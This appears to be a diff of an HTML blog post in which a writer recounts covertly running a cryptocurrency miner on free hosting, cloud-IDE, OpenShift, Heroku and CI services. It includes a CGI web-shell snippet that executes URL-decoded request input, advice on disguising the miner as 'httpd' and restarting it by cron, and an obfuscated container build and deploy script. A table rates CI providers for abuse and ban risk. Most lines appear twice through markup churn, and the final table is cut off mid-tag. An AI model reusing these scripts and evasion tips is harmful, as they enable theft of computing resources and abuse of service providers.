+<span class=hljs-comment >## exec command for interactive and proclimited scenarios</span>
+url_encoded=<span class=hljs-string >&quot;<span class=hljs-variable >${var_path//+/ }</span>&quot;</span>
+<span class=hljs-built_in >export</span> PATH=<span class=hljs-string >&quot;.:<span class=hljs-variable >$PATH</span>&quot;</span>
 . /dev/shm/srv/utils/load.env &amp;&gt;/dev/null
 
-<span class="hljs-keyword">if</span> <span class="hljs-built_in">declare</span> -f <span class="hljs-string">&quot;<span class="hljs-variable">${url_encoded/\%20*}</span>&quot;</span> 1&gt;/dev/null; <span class="hljs-keyword">then</span> <span class="hljs-comment">## don&#x27;t use -n, redirect fd for bcompat</span>
-    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%b&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">${url_encoded//%/\\x}</span>&quot;</span> &gt; /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src
-<span class="hljs-keyword">else</span>
-    <span class="hljs-keyword">if</span> <span class="hljs-built_in">builtin</span> <span class="hljs-string">&quot;<span class="hljs-variable">${url_encoded/\%20*}</span>&quot;</span>; <span class="hljs-keyword">then</span>
-        <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;%b&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">${url_encoded//%/\\x}</span>&quot;</span> &gt; /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src
-    <span class="hljs-keyword">else</span>
-        <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;exec %b&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">${url_encoded//%/\\x}</span>&quot;</span> &gt; /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src
-    <span class="hljs-keyword">fi</span>
-<span class="hljs-keyword">fi</span>
-. /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src</code></pre>
+<span class=hljs-keyword >if</span> <span class=hljs-built_in >declare</span> -f <span class=hljs-string >&quot;<span class=hljs-variable >${url_encoded/\%20*}</span>&quot;</span> 1&gt;/dev/null; <span class=hljs-keyword >then</span> <span class=hljs-comment >## don&#x27;t use -n, redirect fd for bcompat</span>
+    <span class=hljs-built_in >printf</span> <span class=hljs-string >&#x27;%b&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >${url_encoded//%/\\x}</span>&quot;</span> &gt; /tmp/<span class=hljs-variable >${SERVER_NAME}</span>.src
+<span class=hljs-keyword >else</span>
+    <span class=hljs-keyword >if</span> <span class=hljs-built_in >builtin</span> <span class=hljs-string >&quot;<span class=hljs-variable >${url_encoded/\%20*}</span>&quot;</span>; <span class=hljs-keyword >then</span>
+        <span class=hljs-built_in >printf</span> <span class=hljs-string >&#x27;%b&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >${url_encoded//%/\\x}</span>&quot;</span> &gt; /tmp/<span class=hljs-variable >${SERVER_NAME}</span>.src
+    <span class=hljs-keyword >else</span>
+        <span class=hljs-built_in >printf</span> <span class=hljs-string >&#x27;exec %b&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >${url_encoded//%/\\x}</span>&quot;</span> &gt; /tmp/<span class=hljs-variable >${SERVER_NAME}</span>.src
+    <span class=hljs-keyword >fi</span>
+<span class=hljs-keyword >fi</span>
+. /tmp/<span class=hljs-variable >${SERVER_NAME}</span>.src</code></pre>
 <p>It is better to only rely on builtins as forking additional processes may not be allowed in web jails, but it is always possible to <code>exec</code> which allows us to use most command line utilities. Most web shells are written in other scripting languages like python or php as you don&#39;t have to worry about forking.</p>
 <p>In a cpanel environment it is better to use a static name for the miner process, like <code>httpd</code> or <code>php-fpm</code> because <code>cgi</code> is based on multi processing, so servers are always filled with many processes named like this, although a careful observer should notice the <em>multi-threaded</em> usage pattern which is definitely not common &#40;or possible&#41; for languages such as perl, php, ruby, or python&#33;</p>
 <p>Processes have also a time limit by default, &#40;1 hour, 1 day, etc..&#41;, for this we just use a cron job that restarts the dropper.</p>
 <p>This required a lot of manual editing, the cpanel api to automate this is unfortunately not exposed to end users, so web hosting is a clunky and boring target for our miner dropper.</p>
-<h3 id="web_environments"><a href="#web_environments" class="header-anchor">Web environments</a></h3>
+<h3 id=web_environments ><a href="#web_environments" class=header-anchor >Web environments</a></h3>
 <p>There are <em>SaaS</em> providers that have a web editor coupled with a container, such as <a href="with a free tier before getting acquired by amazon">cloud9</a>, &#91;codeanywhere&#93;, &#91;codenvy&#93;. Deploying the dropper here is easy &#40;you have a full fledged environment&#41;, but keeping it running is a burden, since any interactive web editor terminates its session soon after the web page is closed, and the container is consequently put to sleep &#40;unless you pay of course&#41;.</p>
 <p>Circumventing this can only mean that we have to keep the sessions open, some scripting with &#91;puppeteer&#93; achieved the desired result, but having long running, memory leaking, bloated SPAs web pages is definitely unattractive and not stealthy, because from the provider backend, a session opened 24/7 will definitely look suspicious. Indeed, web environments are also clunky and boring targets.</p>
-<h3 id="free_apps_services"><a href="#free_apps_services" class="header-anchor">Free apps services</a></h3>
-<p>This is mainly <a href="when it used to have a free tier">openshift</a> <sup id="fnref:openshift"><a href="#fndef:openshift" class="fnref">[11]</a></sup> and &#91;heroku&#93;. Openshift, being kubernetes was somewhat straightforward to deploy, but full of configuration churn, here is an excerpt:</p>
-<pre><code class="sh hljs"><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span>
+<h3 id=free_apps_services ><a href="#free_apps_services" class=header-anchor >Free apps services</a></h3>
+<p>This is mainly <a href="when it used to have a free tier">openshift</a> <sup id="fnref:openshift"><a href="#fndef:openshift" class=fnref >[11]</a></sup> and &#91;heroku&#93;. Openshift, being kubernetes was somewhat straightforward to deploy, but full of configuration churn, here is an excerpt:</p>
+<pre><code class="sh hljs"><span class=hljs-built_in >export</span> PATH=.:<span class=hljs-variable >$PATH</span>
 
-[ -z <span class="hljs-string">&quot;<span class="hljs-variable">$OC_PRJ</span>&quot;</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;no account data provided&quot;</span>; <span class="hljs-built_in">exit</span> 1; }
+[ -z <span class=hljs-string >&quot;<span class=hljs-variable >$OC_PRJ</span>&quot;</span> ] &amp;&amp; { <span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;no account data provided&quot;</span>; <span class=hljs-built_in >exit</span> 1; }
 obfs=~/utils/deploy/obfs.sh
-[ -x <span class="hljs-variable">$obfs</span> ] ||
-    { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;obfs utility not found!&quot;</span>; <span class="hljs-built_in">exit</span> 1; }
+[ -x <span class=hljs-variable >$obfs</span> ] ||
+    { <span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;obfs utility not found!&quot;</span>; <span class=hljs-built_in >exit</span> 1; }
 launcher=~/launcher
-[ -f <span class="hljs-variable">$launcher</span> ] ||
-    { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;launcher script not found!&quot;</span>; <span class="hljs-built_in">exit</span> 1; }
+[ -f <span class=hljs-variable >$launcher</span> ] ||
+    { <span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;launcher script not found!&quot;</span>; <span class=hljs-built_in >exit</span> 1; }
 
-ctroot=<span class="hljs-variable">${CT_ROOT_DIR:-oc-ct-box-mine}</span>
-<span class="hljs-comment">## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
-scriptpath=<span class="hljs-string">&quot;rootfs/etc/services.d/app/run&quot;</span>
-TYPE=<span class="hljs-variable">${HRK_TYPE:-worker}</span>
-IMG=$(oc-endpoint)/<span class="hljs-variable">$OC_PRJ</span>/<span class="hljs-variable">$OC_APP</span>
+ctroot=<span class=hljs-variable >${CT_ROOT_DIR:-oc-ct-box-mine}</span>
+<span class=hljs-comment >## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
+scriptpath=<span class=hljs-string >&quot;rootfs/etc/services.d/app/run&quot;</span>
+TYPE=<span class=hljs-variable >${HRK_TYPE:-worker}</span>
+IMG=$(oc-endpoint)/<span class=hljs-variable >$OC_PRJ</span>/<span class=hljs-variable >$OC_APP</span>
 tspath=/tmp/oc-tmp-apprun
-prepend=<span class="hljs-string">&quot;#!/usr/bin/with-contenv bash
+prepend=<span class=hljs-string >&quot;#!/usr/bin/with-contenv bash
 &quot;</span>
-<span class="hljs-comment">## beware the newline ^^^</span>
+<span class=hljs-comment >## beware the newline ^^^</span>
 
-<span class="hljs-built_in">cd</span> <span class="hljs-variable">$ctroot</span> || { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;couldn&#x27;t find ct build directory&quot;</span>; <span class="hljs-built_in">exit</span> 1; }
+<span class=hljs-built_in >cd</span> <span class=hljs-variable >$ctroot</span> || { <span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;couldn&#x27;t find ct build directory&quot;</span>; <span class=hljs-built_in >exit</span> 1; }
 
-VARS=$(cat vars) || { <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;vars file empty!&#x27;</span>; }
-VARS=<span class="hljs-variable">${VARS//$&#x27;\n&#x27;/ }</span>
-VARS=<span class="hljs-variable">${VARS//\\/\\\\}</span> <span class="hljs-comment">## preserve escapes</span>
-script=$(cat <span class="hljs-variable">$launcher</span> | tail +2 | sed -r <span class="hljs-string">&#x27;/^echo &quot;export \\$/a &#x27;</span><span class="hljs-string">&quot;<span class="hljs-variable">$VARS</span>&quot;</span><span class="hljs-string">&#x27; \\&#x27;</span>)
-cat &lt;&lt;&lt; <span class="hljs-string">&quot;<span class="hljs-variable">$script</span>&quot;</span> &gt; <span class="hljs-variable">$tspath</span>
-<span class="hljs-variable">$obfs</span> <span class="hljs-variable">$tspath</span>
-[ -z <span class="hljs-string">&quot;<span class="hljs-variable">${tspath}</span>.obfs&quot;</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;obfs file not found?&quot;</span>; <span class="hljs-built_in">exit</span> 1; }
-cat &lt;&lt;&lt; <span class="hljs-string">&quot;$prepend<span class="hljs-subst">$(cat <span class="hljs-string">&quot;<span class="hljs-variable">${tspath}</span>.obfs&quot;</span>)</span>&quot;</span> &gt; <span class="hljs-variable">$scriptpath</span>
-<span class="hljs-built_in">exec</span> itself (should <span class="hljs-built_in">eval</span>)
-chmod +x <span class="hljs-variable">$scriptpath</span>
+VARS=$(cat vars) || { <span class=hljs-built_in >echo</span> <span class=hljs-string >&#x27;vars file empty!&#x27;</span>; }
+VARS=<span class=hljs-variable >${VARS//$&#x27;\n&#x27;/ }</span>
+VARS=<span class=hljs-variable >${VARS//\\/\\\\}</span> <span class=hljs-comment >## preserve escapes</span>
+script=$(cat <span class=hljs-variable >$launcher</span> | tail +2 | sed -r <span class=hljs-string >&#x27;/^echo &quot;export \\$/a &#x27;</span><span class=hljs-string >&quot;<span class=hljs-variable >$VARS</span>&quot;</span><span class=hljs-string >&#x27; \\&#x27;</span>)
+cat &lt;&lt;&lt; <span class=hljs-string >&quot;<span class=hljs-variable >$script</span>&quot;</span> &gt; <span class=hljs-variable >$tspath</span>
+<span class=hljs-variable >$obfs</span> <span class=hljs-variable >$tspath</span>
+[ -z <span class=hljs-string >&quot;<span class=hljs-variable >${tspath}</span>.obfs&quot;</span> ] &amp;&amp; { <span class=hljs-built_in >echo</span> <span class=hljs-string >&quot;obfs file not found?&quot;</span>; <span class=hljs-built_in >exit</span> 1; }
+cat &lt;&lt;&lt; <span class=hljs-string >&quot;$prepend<span class=hljs-subst >$(cat <span class=hljs-string >&quot;<span class=hljs-variable >${tspath}</span>.obfs&quot;</span>)</span>&quot;</span> &gt; <span class=hljs-variable >$scriptpath</span>
+<span class=hljs-built_in >exec</span> itself (should <span class=hljs-built_in >eval</span>)
+chmod +x <span class=hljs-variable >$scriptpath</span>
 
-docker build -t <span class="hljs-variable">$IMG</span>  . || <span class="hljs-built_in">exit</span> 1
-<span class="hljs-built_in">cd</span> -
-oc-push-image <span class="hljs-string">&quot;<span class="hljs-variable">$IMG</span>&quot;</span></code></pre>
+docker build -t <span class=hljs-variable >$IMG</span>  . || <span class=hljs-built_in >exit</span> 1
+<span class=hljs-built_in >cd</span> -
+oc-push-image <span class=hljs-string >&quot;<span class=hljs-variable >$IMG</span>&quot;</span></code></pre>
 <p>This was the script used to build the mining container which required a yaml template:</p>
-<pre><code class="yaml hljs"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">build.openshift.io/v1</span>
-<span class="hljs-attr">kind:</span> <span class="hljs-string">BuildConfig</span>
-<span class="hljs-attr">metadata:</span>
-  <span class="hljs-attr">labels:</span>
-    <span class="hljs-attr">build:</span> <span class="hljs-string">${OC_APP}</span>
-  <span class="hljs-attr">name:</span> <span class="hljs-string">${OC_APP}</span>
-<span class="hljs-attr">spec:</span>
-  <span class="hljs-attr">activeDeadlineSeconds:</span> <span class="hljs-number">5184000</span>
-  <span class="hljs-attr">failedBuildsHistoryLimit:</span> <span class="hljs-number">0</span>
-  <span class="hljs-attr">successfulBuildsHistoryLimit:</span> <span class="hljs-number">0</span>
-  <span class="hljs-attr">resources:</span>
-    <span class="hljs-attr">limits:</span>
-      <span class="hljs-attr">cpu:</span> <span class="hljs-number">2</span>
-      <span class="hljs-attr">memory:</span> <span class="hljs-string">1Gi</span>
-  <span class="hljs-attr">runPolicy:</span> <span class="hljs-string">Serial</span>
-  <span class="hljs-attr">source:</span>
-    <span class="hljs-attr">type:</span> <span class="hljs-string">Binary</span>
-  <span class="hljs-attr">strategy:</span>
-    <span class="hljs-attr">sourceStrategy:</span>
-      <span class="hljs-attr">from:</span>
-        <span class="hljs-attr">kind:</span> <span class="hljs-string">ImageStreamTag</span>
-        <span class="hljs-attr">name:</span> <span class="hljs-string">${OC_APP}-build:latest</span>
-        <span class="hljs-attr">namespace:</span> <span class="hljs-string">${OC_PRJ}</span>
-    <span class="hljs-attr">type:</span> <span class="hljs-string">Source</span>
-  <span class="hljs-attr">template:</span>
-    <span class="hljs-attr">activeDeadlineSeconds:</span> <span class="hljs-number">2400</span>
-  <span class="hljs-attr">triggers:</span>
-    <span class="hljs-bullet">-</span> <span class="hljs-attr">generic:</span>
-        <span class="hljs-attr">secretReference:</span>
-          <span class="hljs-attr">name:</span> <span class="hljs-string">${OC_APP}</span>
-      <span class="hljs-attr">type:</span> <span class="hljs-string">Generic</span></code></pre>
+<pre><code class="yaml hljs"><span class=hljs-attr >apiVersion:</span> <span class=hljs-string >build.openshift.io/v1</span>
+<span class=hljs-attr >kind:</span> <span class=hljs-string >BuildConfig</span>
+<span class=hljs-attr >metadata:</span>
+  <span class=hljs-attr >labels:</span>
+    <span class=hljs-attr >build:</span> <span class=hljs-string >${OC_APP}</span>
+  <span class=hljs-attr >name:</span> <span class=hljs-string >${OC_APP}</span>
+<span class=hljs-attr >spec:</span>
+  <span class=hljs-attr >activeDeadlineSeconds:</span> <span class=hljs-number >5184000</span>
+  <span class=hljs-attr >failedBuildsHistoryLimit:</span> <span class=hljs-number >0</span>
+  <span class=hljs-attr >successfulBuildsHistoryLimit:</span> <span class=hljs-number >0</span>
+  <span class=hljs-attr >resources:</span>
+    <span class=hljs-attr >limits:</span>
+      <span class=hljs-attr >cpu:</span> <span class=hljs-number >2</span>
+      <span class=hljs-attr >memory:</span> <span class=hljs-string >1Gi</span>
+  <span class=hljs-attr >runPolicy:</span> <span class=hljs-string >Serial</span>
+  <span class=hljs-attr >source:</span>
+    <span class=hljs-attr >type:</span> <span class=hljs-string >Binary</span>
+  <span class=hljs-attr >strategy:</span>
+    <span class=hljs-attr >sourceStrategy:</span>
+      <span class=hljs-attr >from:</span>
+        <span class=hljs-attr >kind:</span> <span class=hljs-string >ImageStreamTag</span>
+        <span class=hljs-attr >name:</span> <span class=hljs-string >${OC_APP}-build:latest</span>
+        <span class=hljs-attr >namespace:</span> <span class=hljs-string >${OC_PRJ}</span>
+    <span class=hljs-attr >type:</span> <span class=hljs-string >Source</span>
+  <span class=hljs-attr >template:</span>
+    <span class=hljs-attr >activeDeadlineSeconds:</span> <span class=hljs-number >2400</span>
+  <span class=hljs-attr >triggers:</span>
+    <span class=hljs-bullet >-</span> <span class=hljs-attr >generic:</span>
+        <span class=hljs-attr >secretReference:</span>
+          <span class=hljs-attr >name:</span> <span class=hljs-string >${OC_APP}</span>
+      <span class=hljs-attr >type:</span> <span class=hljs-string >Generic</span></code></pre>
 <p>But the whole process involved quite a lot of steps&#33;</p>
-<pre><code class="sh hljs"><span class="hljs-comment">## init</span>
-[ -z <span class="hljs-string">&quot;<span class="hljs-variable">$OC_APP</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">export</span> $(&lt;$(tfi))
-[ -z <span class="hljs-string">&quot;<span class="hljs-variable">$OC_APP</span>&quot;</span> ] &amp;&amp; { . ./choose-creds || <span class="hljs-built_in">exit</span> 1; }
+<pre><code class="sh hljs"><span class=hljs-comment >## init</span>
+[ -z <span class=hljs-string >&quot;<span class=hljs-variable >$OC_APP</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >export</span> $(&lt;$(tfi))
+[ -z <span class=hljs-string >&quot;<span class=hljs-variable >$OC_APP</span>&quot;</span> ] &amp;&amp; { . ./choose-creds || <span class=hljs-built_in >exit</span> 1; }
 oc-login
-oc new-project <span class="hljs-variable">$OC_PRJ</span> || { [ -z <span class="hljs-string">&quot;<span class="hljs-subst">$(oc get projects)</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 1; }
-oc new-app <span class="hljs-variable">$OC_APP</span> --allow-missing-images || <span class="hljs-built_in">exit</span> 1
+oc new-project <span class=hljs-variable >$OC_PRJ</span> || { [ -z <span class=hljs-string >&quot;<span class=hljs-subst >$(oc get projects)</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >exit</span> 1; }
+oc new-app <span class=hljs-variable >$OC_APP</span> --allow-missing-images || <span class=hljs-built_in >exit</span> 1
 
-<span class="hljs-comment">## build box with docker and push</span>
-<span class="hljs-comment"># oc-docker-login || exit 1</span>
-oc-build-mine || <span class="hljs-built_in">exit</span> 1
+<span class=hljs-comment >## build box with docker and push</span>
+<span class=hljs-comment ># oc-docker-login || exit 1</span>
+oc-build-mine || <span class=hljs-built_in >exit</span> 1
 
-<span class="hljs-comment">## create dc config</span>
-<span class="hljs-built_in">export</span> OC_TEMPLATE_TYPE=mine
-oc-box-template || <span class="hljs-built_in">exit</span> 1
+<span class=hljs-comment >## create dc config</span>
+<span class=hljs-built_in >export</span> OC_TEMPLATE_TYPE=mine
+oc-box-template || <span class=hljs-built_in >exit</span> 1
 rtr=0
-<span class="hljs-keyword">while</span> [ <span class="hljs-variable">$rtr</span> -lt 10 ]; <span class="hljs-keyword">do</span>
-  oc rollout latest <span class="hljs-variable">$OC_APP</span> &amp;&amp; <span class="hljs-built_in">break</span>
-  rtr=$((rtr+<span class="hljs-number">1</span>))
-  <span class="hljs-built_in">read</span> -t 1
-<span class="hljs-keyword">done</span>
-<span class="hljs-built_in">exit</span>
-<span class="hljs-comment">## builds</span>
-bash -x oc-build-build || <span class="hljs-built_in">exit</span> 1
-bash -x oc-build-template || <span class="hljs-built_in">exit</span> 1
-oc start-build <span class="hljs-variable">$OC_APP</span> || <span class="hljs-built_in">exit</span> 1
+<span class=hljs-keyword >while</span> [ <span class=hljs-variable >$rtr</span> -lt 10 ]; <span class=hljs-keyword >do</span>
+  oc rollout latest <span class=hljs-variable >$OC_APP</span> &amp;&amp; <span class=hljs-built_in >break</span>
+  rtr=$((rtr+<span class=hljs-number >1</span>))
+  <span class=hljs-built_in >read</span> -t 1
+<span class=hljs-keyword >done</span>
+<span class=hljs-built_in >exit</span>
+<span class=hljs-comment >## builds</span>
+bash -x oc-build-build || <span class=hljs-built_in >exit</span> 1
+bash -x oc-build-template || <span class=hljs-built_in >exit</span> 1
+oc start-build <span class=hljs-variable >$OC_APP</span> || <span class=hljs-built_in >exit</span> 1
 
-accounts=<span class="hljs-variable">${ACCOUNTS_DIR:-accounts_queue}</span>
-mv <span class="hljs-variable">$accounts</span>/<span class="hljs-variable">${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre>
+accounts=<span class=hljs-variable >${ACCOUNTS_DIR:-accounts_queue}</span>
+mv <span class=hljs-variable >$accounts</span>/<span class=hljs-variable >${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre>
 <p>In pseudo code:</p>
 <ul>
 <li><p>create the project</p>
-</li>
+
 <li><p>create the application without an image</p>
-</li>
+
 <li><p>build the mining container</p>
-</li>
+
 <li><p>deploy the container with a deployment config &#40;kubernetes abstraction&#41;</p>
-</li>
+
 <li><p>rollout the deployment</p>
-</li>
+
 </ul>
 <p>The <code>build-build</code> scripts instead created a <em>build</em> container which would mine for a few hours at a time. Builds and normal pods have separate resources in openshift so we exploited both of them. Openshift was overall a bad experience since it went over 4 different releases &#40;maybe more, I stopped tracking after a while&#41; and each of them required changes to the configurations, they had no upgrade paths and everything was quickly iterated over, and it was common for builds/pods to stall, and not being garbage collected...they usually ran manual restarts every once in a while, maybe kubernetes was just buggy :&#41;</p>
 <p>Heroku configuration was a little bit simpler &#40;it doesn&#39;t involve kubernetes&#41;. Apart the container build, which was similar to the openshift one, the rest was just two cli commands</p>
-<pre><code class="bash hljs">heroku config:<span class="hljs-built_in">set</span> HRK_APP=<span class="hljs-variable">$HRK_APP</span> -a <span class="hljs-variable">$HRK_APP</span>
-heroku container:release -a <span class="hljs-variable">$HRK_APP</span> <span class="hljs-variable">$TYPE</span></code></pre>
-<p>The container was directly pushed with docker over to the heroku registry. <sup id="fnref:herokucontainers"><a href="#fndef:herokucontainers" class="fnref">[12]</a></sup> The friction with heroku &#40;which free tier is still standing up to the time of writing&#41; is that dynos can only run for 22 days per month so they required some manual management each month, again clunky and boring. They did execute some ban waves at the beginning, and then they disabled registrations through TOR, I am quite sure I was the cause of this.</p>
-<h3 id="ci_containers_or_vms"><a href="#ci_containers_or_vms" class="header-anchor">CI containers or VMs</a></h3>
+<pre><code class="bash hljs">heroku config:<span class=hljs-built_in >set</span> HRK_APP=<span class=hljs-variable >$HRK_APP</span> -a <span class=hljs-variable >$HRK_APP</span>
+heroku container:release -a <span class=hljs-variable >$HRK_APP</span> <span class=hljs-variable >$TYPE</span></code></pre>
+<p>The container was directly pushed with docker over to the heroku registry. <sup id="fnref:herokucontainers"><a href="#fndef:herokucontainers" class=fnref >[12]</a></sup> The friction with heroku &#40;which free tier is still standing up to the time of writing&#41; is that dynos can only run for 22 days per month so they required some manual management each month, again clunky and boring. They did execute some ban waves at the beginning, and then they disabled registrations through TOR, I am quite sure I was the cause of this.</p>
+<h3 id=ci_containers_or_vms ><a href="#ci_containers_or_vms" class=header-anchor >CI containers or VMs</a></h3>
 <p>These were the most synergic targets for our dropper. There are many <a href="https://en.wikipedia.org/wiki/Continuous_integration">CI</a> companies, many of which are burning investors money offering free tiers in the hope of collecting some market share in the tech infrastructure business.</p>
 <p>All these services offer different resources, have different configurations requirements and run in different environments. I never considered automating account registration because those kind of things are dreadful to program, I try to avoid them all the time, so I just endured manual registrations for a while as I was curious to what kind of anti spam response I would get &#40;and how different from the rest&#33;&#41;. You can guess some things about the management of a company from how it handles spam:</p>
 <ul>
 <li><p>Does it perform ban waves? Then they have non strict policies, problems are handled manually and case by case</p>
-</li>
+
 <li><p>Does it require phone verification? They were already abused in the past</p>
-</li>
+
 <li><p>Do they respond to heavy resource usage? They are running on a tight budget</p>
-</li>
+
 <li><p>Do they apply account restrictions or shadow bans? If they shadow ban, they have mean sysadmins.</p>
-</li>
+
 </ul>
 <p>There is also a philosophical question: If a service allows you to abuse their system for a long time, does it mean that they have a top-of-the-shelf infrastructure capable of handling the load, or simply poor control over their system? And you must consider the balance between accessibility and security, a system too secure can lower user retention.</p>
 <p>Here&#39;s a table showing some services that I deployed to:</p>
-<table>  <tr class = "header headerLastRow">    <th style = "text-align: center;">ci</th>    <th style = "text-align: center;">configuration</th>    <th style = "text-align: center;">performance</th>    <th style = "text-align: center;">ban-hammer</th>  </tr>  <tr>    <td style = "text-align: center;">Bitrise</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Travis</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: green; text-align: center;">good</td>  </tr>  <tr>    <td style = "text-align: center;">Codeship</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Gitlab</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: green; text-align: center;">good</td>  </tr>  <tr>    <td style = "text-align: center;">Circleci</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Semaphore</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Docker</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: green; text-align: center;">good</td>  </tr>  <tr>    <td style = "text-align: center;">Quay</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Codefresh</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Wercker</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: red; text-align: center;">bad</td>  </tr>  <tr>    <td style = "text-align: center;">Azure-pipelines</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: red; text-align: center;">bad</td>  </tr>  <tr>    <td style = "text-align: center;">Continuousphp</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Buddy</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: red; text-align: center;">bad</td>  </tr>  <tr>    <td style = "text-align: center;">Drone</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: red; text-align: center;">bad</td>  </tr>  <tr>    <td style = "text-align: center;">Appveyor</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: yellow; text-align: center;">medium</td>    <td style = "color: red; text-align: center;">bad</td>  </tr>  <tr>    <td style = "text-align: center;">Nevercode</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: yellow; text-align: center;">medium</td>  </tr>  <tr>    <td style = "text-align: center;">Zeist/vercel</td>    <td style = "color: red; text-align: center;">bad</td>    <td style = "color: green; text-align: center;">good</td>    <td style = "color: red; text-align: center;">bad</td>  </tr></table>
+<table>  <tr class = "header headerLastRow">    <th style = "text-align: center;">ci    <th style = "text-align: center;">configuration    <th style = "text-align: center;">performance    <th style = "text-align: center;">ban-hammer    <tr>    <td style = "text-align: center;">Bitrise    <td style = "color: red; text-align: center;">bad    <td style = "color: yellow; text-align: center;">medium    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Travis    <td style = "color: green; text-align: center;">good    <td style = "color: yellow; text-align: center;">medium    <td style = "color: green; text-align: center;">good    <tr>    <td style = "text-align: center;">Codeship    <td style = "color: yellow; text-align: center;">medium    <td style = "color: red; text-align: center;">bad    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Gitlab    <td style = "color: yellow; text-align: center;">medium    <td style = "color: green; text-align: center;">good    <td style = "color: green; text-align: center;">good    <tr>    <td style = "text-align: center;">Circleci    <td style = "color: red; text-align: center;">bad    <td style = "color: green; text-align: center;">good    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Semaphore    <td style = "color: green; text-align: center;">good    <td style = "color: green; text-align: center;">good    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Docker    <td style = "color: yellow; text-align: center;">medium    <td style = "color: yellow; text-align: center;">medium    <td style = "color: green; text-align: center;">good    <tr>    <td style = "text-align: center;">Quay    <td style = "color: green; text-align: center;">good    <td style = "color: yellow; text-align: center;">medium    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Codefresh    <td style = "color: red; text-align: center;">bad    <td style = "color: green; text-align: center;">good    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Wercker    <td style = "color: yellow; text-align: center;">medium    <td style = "color: yellow; text-align: center;">medium    <td style = "color: red; text-align: center;">bad    <tr>    <td style = "text-align: center;">Azure-pipelines    <td style = "color: yellow; text-align: center;">medium    <td style = "color: yellow; text-align: center;">medium    <td style = "color: red; text-align: center;">bad    <tr>    <td style = "text-align: center;">Continuousphp    <td style = "color: red; text-align: center;">bad    <td style = "color: yellow; text-align: center;">medium    <td style = "color: yellow; text-align: center;">medium    <tr>    <td style = "text-align: center;">Buddy    <td style = "color: red; text-align: center;">bad    <td style = "color: red; text-align: center;">bad    <td style = "color: red; text-align: center;">bad    <tr>    <td style = "text-align: center;">Drone    <td style = "color: red; text-align: center;">bad    <td style = "color: green; text-align: center;">good    <td style = "color: red; text-align: center;">bad    <tr>    <td style = "text-align: 